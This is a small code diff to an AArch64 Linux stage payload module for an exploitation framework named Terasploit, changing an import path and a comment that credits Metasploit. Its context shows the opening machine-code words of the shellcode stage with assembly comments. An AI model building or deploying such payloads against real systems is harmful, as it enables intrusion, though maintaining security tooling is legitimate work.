@@ -1,7 +1,7 @@
 import struct
 from collections.abc import Mapping, Sequence
 
-from teralibs.tsf.base.payload import ARCH_AARCH64, PLATFORM_LINUX, STAGE, Payload
+from terasploit.module.payload import ARCH_AARCH64, PLATFORM_LINUX, STAGE, Payload
 
 
 # Terasploit module
@@ -30,7 +30,7 @@ class TerasploitModule(Payload):
     PLATFORM: Sequence = [PLATFORM_LINUX]
     STAGE_BLOB: Mapping = {
         "PAYLOAD": [
-            # Ported from metasploit framework.
+            # Ported from metasploit terasploit.
             0xAA0C03E0,  #  mov	x0, x12
             0xD2800002,  #  mov	x2, #0x0                   	// #0
             0xD2800001,  #  mov	x1, #0x0                   	// #0
